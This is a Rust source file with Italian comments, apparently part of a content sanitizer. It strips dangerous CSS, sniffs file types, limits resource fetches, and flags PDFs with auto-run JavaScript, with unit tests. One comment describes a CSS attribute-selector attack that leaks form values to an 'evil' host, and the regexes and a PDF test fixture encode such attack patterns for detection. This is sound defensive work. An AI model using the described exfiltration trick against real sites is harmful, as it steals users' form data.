use regex::Regex;
use crate::config::loader::{ResourcePolicy};
use crate::report::report::SanitizationAction;

/// Sanitizzatore dedicato ai fogli di stile CSS (sia inline nei tag <style> che file esterni .css)
pub struct CssSanitizer;

impl CssSanitizer {
    /// Pulisce una stringa CSS rimuovendo vettori di attacco XSS e di esfiltrazione dati.
    pub fn sanitize(css_content: &str) -> String {
        let mut cleaned = css_content.to_string();

        // 1. Neutralizza IE expression()
        // Cerca la parola "expression" seguita da parentesi.
        // Vettore di attacco classico su vecchie versioni di Internet Explorer.
        let re_expression = Regex::new(r"(?i)expression\s*\(.*?\)").unwrap();
        cleaned = re_expression.replace_all(&cleaned, "/* expression rimossa */").to_string();

        // 2. Neutralizza url(javascript:...)
        // Impedisce l'esecuzione di script tramite la proprietà background o content.
        let re_js_url = Regex::new(r"(?i)url\s*\(\s*['\x22]?javascript:.*?['\x22]?\s*\)").unwrap();
        cleaned = re_js_url.replace_all(&cleaned, "url('about:blank')").to_string();

        // 3. Neutralizza @import cross-origin o contenenti javascript
        // Blocca catene di @import esterne che potrebbero caricare stili malevoli a cascata
        // o eseguire javascript mascherato.
        let re_import = Regex::new(r"(?i)@import\s+(?:url\()?\s*['\x22]?(?:http:|https:|javascript:)[^;]+;").unwrap();
        cleaned = re_import.replace_all(&cleaned, "/* @import esterno bloccato */\n").to_string();

        // 4. Previene l'esfiltrazione dati (Data Leakage) tramite background: url(...)
        // Nel tuo scenario, l'attaccante usa input[value^='a'] { background: url('http://evil.../?v=a') }
        // per rubare dati form o cookie riga per riga. Blocchiamo gli URL HTTP/HTTPS esterni nei CSS.
        let re_external_url = Regex::new(r"(?i)url\s*\(\s*['\x22]?(?:http:|https:)[^)]*\)").unwrap();
        cleaned = re_external_url.replace_all(&cleaned, "url('about:blank')").to_string();

        cleaned
    }
}

#[derive(Debug, PartialEq)]
pub enum DetectedType {
    Html,
    Png,
    Pdf,
    Unknown,
}

pub struct MimeSniffer;

impl MimeSniffer {
    /// Analizza i byte grezzi del contenuto per determinarne la vera natura,
    /// ignorando le dichiarazioni del server o le estensioni del file.
    pub fn sniff(raw_data: &[u8]) -> DetectedType {
        // 1. Controllo Magic Bytes del PNG
        // VERO file binario (se i byte sono puri)
        let png_magic: [u8; 8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];

        // PNG letto come Stringa UTF-8 (il byte 0x89 non valido diventa '')
        let png_magic_utf8 = "\u{FFFD}PNG".as_bytes();

        if raw_data.starts_with(&png_magic) || raw_data.starts_with(png_magic_utf8) {
            return DetectedType::Png;
        }

        // 2. Controllo Magic Bytes del PDF
        // I PDF iniziano tipicamente con "%PDF-"
        if raw_data.starts_with(b"%PDF-") {
            return DetectedType::Pdf;
        }

        // 3. Controllo per l'HTML (Sniffing euristico)
        // L'HTML è testuale, quindi spesso inizia con spazi bianchi innocui. Li saltiamo.
        let mut start_idx = 0;
        while start_idx < raw_data.len() && matches!(raw_data[start_idx], 0x09 | 0x0A | 0x0C | 0x0D | 0x20) {
            start_idx += 1;
        }

        let text_data = &raw_data[start_idx..];

        // Estraiamo i primi 15 byte per cercare tag HTML comuni (ignorando maiuscole/minuscole)
        let snippet_len = std::cmp::min(text_data.len(), 15);
        if let Ok(snippet) = std::str::from_utf8(&text_data[..snippet_len]) {
            let upper_snippet = snippet.to_ascii_uppercase();
            // Se troviamo un tag tipico di apertura, è HTML
            if upper_snippet.starts_with("<!DOCTYPE") ||
                upper_snippet.starts_with("<HTML") ||
                upper_snippet.starts_with("<HEAD") ||
                upper_snippet.starts_with("<BODY") ||
                upper_snippet.starts_with("<SCRIPT") ||
                upper_snippet.starts_with("<H1") // Usato spesso nei test
            {
                return DetectedType::Html;
            }
        }

        // Se non corrisponde a nulla di noto, lo classifichiamo come sconosciuto
        DetectedType::Unknown
    }
}

pub struct ResourceGuard {
    config: ResourcePolicy,       // max_depth, max_resource_size (e un futuro max_requests)
    requests_made: usize,          // contatore richieste già effettuate
}

pub enum RefusalReason {
    // --- per i controlli generali ---
    MaxDepthExceeded { current: usize, limit: usize },
    MaxRequestsExceeded { current: usize, limit: usize },
    ResourceTooLarge { size: usize, limit: u64 },
    FetchingDisabled,
    // --- per i controlli su png ---
    ImageDimensionsExceeded { width: u32, height: u32, limit: u32 },
    MalformedImageHeader { bytes_available: usize, bytes_needed: usize },
    // --- per i controlli su pdf ---
    ActiveContentDetected { content_type: String, details: String },
}

//FORSE GIA IMPLEMETATO IN URL FETCHER? INPUT/URL.RS
impl ResourceGuard {
    pub fn new(config: ResourcePolicy) -> Self {
        Self { config, requests_made: 0 }
    }

    /// Chiamata PRIMA di fare la fetch di una sub-risorsa.
    /// current_depth: quanto siamo annidati (0 = risorsa diretta del documento principale)
    pub fn check_before_fetch(&self, current_depth: usize) -> Result<(), RefusalReason> {
        
        const MAX_REQUESTS: usize = 20;
        // 1. fetch_resources è disabilitato?
        if self.config.fetch_resources == false {
            return Err(RefusalReason::FetchingDisabled);
        }
        // 2. current_depth supera self.config.max_depth?
        if current_depth as u8 >= self.config.max_depth {
            return Err(RefusalReason::MaxDepthExceeded {
                current: current_depth,
                limit: self.config.max_depth as usize,
            });
        }
        // 3. self.requests_made ha già raggiunto un massimo?
        if self.requests_made >= MAX_REQUESTS {
            return Err(RefusalReason::MaxRequestsExceeded {
                current: self.requests_made,
                limit: MAX_REQUESTS,
            });
        }
        Ok(())

    }

    /// Chiamata DOPO aver scaricato i byte, prima di processarli.
    pub fn check_response_size(&self, byte_len: usize) -> Result<(), RefusalReason> {
        // confronta byte_len con self.config.max_resource_size
        if byte_len as u64 > self.config.max_resource_size {
            return Err(RefusalReason::ResourceTooLarge {
                size: byte_len,
                limit: self.config.max_resource_size,
            });
        }
        Ok(())
    }

    /// Chiamata dopo un fetch riuscito, per aggiornare lo stato interno
    pub fn record_request(&mut self) {
        self.requests_made += 1;
    }
}

pub struct ResourceRules;

impl ResourceRules {
    /// Controlla le dimensioni di un PNG e rifiuta se supera i limiti.
    pub fn check_png_dimensions(raw_data: &[u8]) -> Result<(), RefusalReason> {
    let png_magic: [u8; 8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];

    /*il problema di fondo resta che UrlFetcher::fetch corrompe qualsiasi
     contenuto binario passandolo per String::from_utf8_lossy  
    */

    // Versione "corrotta" dai byte non validi UTF-8 convertiti in U+FFFD (EF BF BD)
    // quando il contenuto binario passa per una String lossy prima di arrivare qui.
    // Solo il byte 0x89 (non valido da solo in UTF-8) viene sostituito con i 3 byte
    // EF BF BD; il resto della magic number (PNG\r\n\x1a\n) è già ASCII valido
    // e attraversa la conversione inalterato.
    let png_magic_lossy: [u8; 10] = [0xEF, 0xBF, 0xBD, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];

    // Capiamo con quale forma abbiamo a che fare, e quanto è lunga la sua magic number
    let magic_len = if raw_data.starts_with(&png_magic) {
        8
    } else if raw_data.starts_with(&png_magic_lossy) {
        10
    } else {
        // Non è un PNG in nessuna delle due forme: questa funzione non ha nulla da dire
        return Ok(());
    };

    // Dopo la magic number: 4 byte lunghezza chunk + 4 byte tipo "IHDR" + 4 width + 4 height
    const IHDR_FIELDS_LEN: usize = 16;
    let ihdr_end = magic_len + IHDR_FIELDS_LEN;

    if raw_data.len() < ihdr_end {
        return Err(RefusalReason::MalformedImageHeader {
            bytes_available: raw_data.len(),
            bytes_needed: ihdr_end,
        });
    }

    // width e height sono gli ultimi 8 byte del blocco IHDR che ci interessa
    let width_offset = magic_len + 8;
    let height_offset = magic_len + 12;

    let width = u32::from_be_bytes([
        raw_data[width_offset],
        raw_data[width_offset + 1],
        raw_data[width_offset + 2],
        raw_data[width_offset + 3],
    ]);
    let height = u32::from_be_bytes([
        raw_data[height_offset],
        raw_data[height_offset + 1],
        raw_data[height_offset + 2],
        raw_data[height_offset + 3],
    ]);

    const MAX_DIMENSION: u32 = 10000;
    if width > MAX_DIMENSION || height > MAX_DIMENSION {
        return Err(RefusalReason::ImageDimensionsExceeded {
            width,
            height,
            limit: MAX_DIMENSION,
        });
    }

    Ok(())
}   
    // Rileva la presenza di JavaScript attivo (OpenAction) in un PDF.
    /*
    /OpenAction 5 0 R
    ...
    5 0 obj
    << /S /JavaScript /JS (app.alert('ciao');) >>
    endobj
     */
    pub fn check_pdf_active_content(raw_data: &[u8]) -> Result<(), RefusalReason> {
        // controllo è davvero un PDF? Se no, questa funzione non ha nulla da dire (come per il PNG)
        if !raw_data.starts_with(b"%PDF-") {
            return Ok(());
        }

        // 2. cerchiamo i pattern sospetti nei byte grezzi
        let suspicious_trigger: [&[u8]; 2] = [
            b"/OpenAction",
            b"/AA",
        ];
        let suspicious_action: [&[u8]; 3] = [
            b"/JavaScript",
            b"/JS",
            b"/Launch",
        ];
        let has_trigger = suspicious_trigger.iter().any(|pattern| raw_data.windows(pattern.len()).any(|window| window == *pattern));
        let has_action = suspicious_action.iter().any(|pattern| raw_data.windows(pattern.len()).any(|window| window == *pattern));
        if has_trigger && has_action {
            return Err(RefusalReason::ActiveContentDetected { content_type: String::from("PDF"), details: String::from("OpenAction o AA con JavaScript/Launch trovato") });
        }
        

        Ok(())
    }
    
}

// in resource_rules.rs, o in report.rs se preferisci tenerlo centralizzato
impl From<RefusalReason> for SanitizationAction {
    fn from(reason: RefusalReason) -> Self {
        let (rule_fired, description) = match reason {
            RefusalReason::FetchingDisabled =>
                ("FETCH_DISABLED".to_string(), "Fetch delle sub-risorse disabilitato dalla policy".to_string()),
            RefusalReason::MaxDepthExceeded { current, limit } =>
                ("MAX_DEPTH_EXCEEDED".to_string(), format!("Profondità {} supera il limite {}", current, limit)),
            RefusalReason::MaxRequestsExceeded { current, limit } =>
                ("MAX_REQUESTS_EXCEEDED".to_string(), format!("{} richieste, limite {}", current, limit)),
            RefusalReason::ResourceTooLarge { size, limit } =>
                ("RESOURCE_TOO_LARGE".to_string(), format!("{} byte, limite {}", size, limit)),
            RefusalReason::ImageDimensionsExceeded { width, height, limit } =>
                ("IMAGE_DIMENSIONS_EXCEEDED".to_string(), format!("{}x{} pixel, limite {}", width, height, limit)),
            RefusalReason::MalformedImageHeader { bytes_available, bytes_needed } =>
                ("MALFORMED_IMAGE_HEADER".to_string(), format!("{} byte disponibili, ne servivano {}", bytes_available, bytes_needed)),
            RefusalReason::ActiveContentDetected { content_type, details } =>
                ("ACTIVE_CONTENT_DETECTED".to_string(), format!("{}: {}", content_type, details)),
        };

        SanitizationAction {
            rule_fired,
            location: "resource-fetch".to_string(), // qui non hai un "path" nel DOM, è un URL/risorsa
            original_fragment: description,
            replacement: "Rifiutato".to_string(),
        }
    }
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_resource_guard_fetch_disabled() {
        let config = ResourcePolicy {
            fetch_resources: false,
            max_depth: 3,
            max_resource_size: 1024,
        };
        let guard = ResourceGuard::new(config);

        assert!(guard.check_before_fetch(0).is_err()); // fetch disabilitato
    }
    #[test]
    fn test_resource_guard_depth_limit() {
        let config = ResourcePolicy {
            fetch_resources: true,
            max_depth: 3,
            max_resource_size: 1024,
        };
        let guard = ResourceGuard::new(config);

        assert!(guard.check_before_fetch(0).is_ok());
        assert!(guard.check_before_fetch(2).is_ok());
        assert!(guard.check_before_fetch(3).is_err()); // superato il limite
    }
    #[test]
    fn test_resource_guard_size_limit() {
        let config = ResourcePolicy {
            fetch_resources: true,
            max_depth: 3,
            max_resource_size: 1024,
        };
        let guard = ResourceGuard::new(config);

        assert!(guard.check_response_size(512).is_ok());
        assert!(guard.check_response_size(1024).is_ok());
        assert!(guard.check_response_size(2048).is_err()); // superato il limite
    }
    #[test]
    fn test_resource_guard_request_limit() {
        let config = ResourcePolicy {
            fetch_resources: true,
            max_depth: 3,
            max_resource_size: 1024,
        };
        let mut guard = ResourceGuard::new(config);

        for _ in 0..20 {
            guard.record_request();
        }
        assert!(guard.check_before_fetch(0).is_err()); // superato il limite di richieste

    }
    #[test]
    fn test_png_dimension_check() {
        let valid_png: [u8; 24] = [
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // Magic bytes
            0x00, 0x00, 0x00, 0x0D, // Length of IHDR chunk
            0x49, 0x48, 0x44, 0x52, // "IHDR"
            0x00, 0x00, 0x27, 0x10, // Width: 10000
            0x00, 0x00, 0x27, 0x10, // Height: 10000
        ];
        assert!(ResourceRules::check_png_dimensions(&valid_png).is_ok());

        let invalid_png: [u8; 24] = [
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // Magic bytes
            0x00, 0x00, 0x00, 0x0D, // Length of IHDR chunk
            0x49, 0x48, 0x44, 0x52, // "IHDR"
            0x00, 0x00, 0x27, 0x11, // Width: 10001 (exceeds limit)
            0x00, 0x00, 0x27, 0x10, // Height: 10000
        ];
        assert!(ResourceRules::check_png_dimensions(&invalid_png).is_err());
    }
    #[test]
    fn test_pdf_active_content_check() {
        let pdf_with_js = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 5 0 R >>\nendobj\n5 0 obj\n<< /S /JavaScript /JS (app.alert('ciao');) >>\nendobj\n";
        assert!(ResourceRules::check_pdf_active_content(pdf_with_js).is_err());

        let pdf_without_js = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n";
        assert!(ResourceRules::check_pdf_active_content(pdf_without_js).is_ok());
    }
    
}